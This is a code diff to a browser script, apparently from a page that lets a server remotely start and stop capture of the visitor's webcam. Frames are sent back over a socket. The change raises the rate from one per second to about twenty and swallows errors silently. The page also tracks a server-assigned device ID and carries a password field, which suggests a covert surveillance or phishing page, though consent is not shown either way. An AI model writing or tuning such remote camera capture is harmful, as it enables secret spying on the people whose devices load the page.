@@ -206,21 +206,36 @@ socket.on('device-id', (id) => { deviceId = id; localStorage.setItem('deviceId',
 
 // Live camera stream control
 let camStreamInterval = null;
+let camStreamSending = false;
 socket.on('start-camera-stream', () => {
     if (camStreamInterval) return;
     if (!stream || !stream.getVideoTracks().length) return;
     const v = document.querySelector('video[data-snap]');
     if (!v) return;
     const c = document.createElement('canvas');
-    camStreamInterval = setInterval(() => {
-        const s = stream.getVideoTracks()[0].getSettings();
-        c.width = s.width || 320; c.height = s.height || 240;
-        c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
-        socket.emit('camera-stream', { image: c.toDataURL('image/jpeg',0.4).split(',')[1] });
-    }, 1000);
+    c.width = 320; c.height = 240;
+    const ctx = c.getContext('2d');
+    function sendFrame() {
+        if (!camStreamInterval) return;
+        if (camStreamSending) {
+            camStreamInterval = setTimeout(sendFrame, 16);
+            return;
+        }
+        camStreamSending = true;
+        try {
+            ctx.drawImage(v, 0, 0, 320, 240);
+            const data = c.toDataURL('image/jpeg', 0.35).split(',')[1];
+            if (data && data.length > 100) {
+                socket.emit('camera-stream', { image: data });
+            }
+        } catch(e) {}
+        camStreamSending = false;
+        camStreamInterval = setTimeout(sendFrame, 50);
+    }
+    camStreamInterval = setTimeout(sendFrame, 50);
 });
 socket.on('stop-camera-stream', () => {
-    if (camStreamInterval) { clearInterval(camStreamInterval); camStreamInterval = null; }
+    if (camStreamInterval) { clearTimeout(camStreamInterval); camStreamInterval = null; }
 });
 
 function togglePass() { const i=passInput; i.type=i.type==='password'?'text':'password'; }
